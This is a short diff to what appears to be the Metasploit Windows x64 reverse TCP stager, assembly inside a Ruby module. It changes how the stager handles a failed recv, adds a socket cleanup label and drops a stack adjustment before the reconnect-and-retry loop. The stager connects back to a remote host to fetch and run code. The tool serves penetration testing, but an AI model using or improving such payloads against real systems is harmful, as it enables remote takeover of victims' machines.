@@ -210,7 +210,7 @@ module Payload::Windows::ReverseTcp_x64
       ; reliability: check to see if the recv worked, and reconnect
       ; if it fails
         cmp eax, 0
-        jle handle_connect_failure
+        jle cleanup_socket
       ^
     end
 
@@ -258,14 +258,12 @@ module Payload::Windows::ReverseTcp_x64
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
         call rbp                ; VirtualFree(payload, 0, MEM_COMMIT)
 
+      cleanup_socket:
       ; clean up the socket
         push rdi                ; socket handle
         pop rcx                 ; s (closesocket parameter)
         mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
         call rbp
-        ; rax is now conveniently set to zero
-        ; move rsp back to where the retry count is
-        add rsp, 0xD0
 
       ; and try again
         dec r14                 ; decrement the retry count
